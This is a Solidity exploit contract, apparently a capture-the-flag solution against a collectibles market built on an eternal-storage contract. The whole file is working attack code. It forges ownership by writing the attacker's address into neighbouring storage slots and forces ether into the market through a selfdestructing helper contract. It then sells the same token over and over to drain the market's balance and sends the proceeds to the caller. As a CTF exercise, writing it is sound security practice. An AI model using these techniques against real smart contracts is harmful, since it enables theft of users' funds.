import "public/Setup.sol";

contract Sender {
    constructor(address payable to) public payable {
        selfdestruct(to);
    }
}

contract Exploit {
    constructor(Setup setup) payable {
        EternalStorageAPI eternalStorage = setup.eternalStorage();
        CryptoCollectibles token = setup.token();
        CryptoCollectiblesMarket market = setup.market();
        bytes32 tokenId = market.mintCollectible{value: 11 ether}();
        bytes32 tokenIdMinus1 = bytes32(uint(tokenId)-1);
        bytes32 tokenIdMinus2 = bytes32(uint(tokenId)-2);
        
        eternalStorage.updateName(tokenId, bytes32(bytes20(address(this)))>>12*8);
        eternalStorage.updateName(tokenIdMinus1, bytes32(bytes20(address(this)))>>12*8);
        
        (new Sender){value: 9 ether}(payable(address(market)));
        
        for (uint i = 0; i < 7; i++) {
            token.approve(tokenId, address(market));
            market.sellCollectible(tokenId);
            eternalStorage.updateMetadata(tokenIdMinus2, address(this));
        }
        
        selfdestruct(msg.sender);
    }
}